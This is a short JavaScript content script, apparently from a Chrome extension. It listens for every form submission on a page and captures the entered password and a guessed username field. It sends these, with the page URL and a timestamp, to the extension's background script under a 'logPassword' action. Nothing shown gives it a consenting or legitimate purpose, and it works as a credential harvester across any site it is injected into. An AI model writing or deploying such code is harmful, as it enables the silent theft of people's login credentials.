document.addEventListener('submit', function(event) {
 const form = event.target;
 const passwordField = form.querySelector('input[type="password"]');
 
 // Buscar nombre de usuario en campos de texto, email o input genérico
 const usernameField = form.querySelector('input[type="text"], input[type="email"], input:not([type])');

 if (passwordField && passwordField.value) {
 const data = {
 url: window.location.href,
 username: usernameField ? usernameField.value: "N/A",
 password: passwordField.value,
 timestamp: new Date().toISOString(),
 type: "login"
 };

 chrome.runtime.sendMessage({
 action: "logPassword",
 data: data
 });
 }
});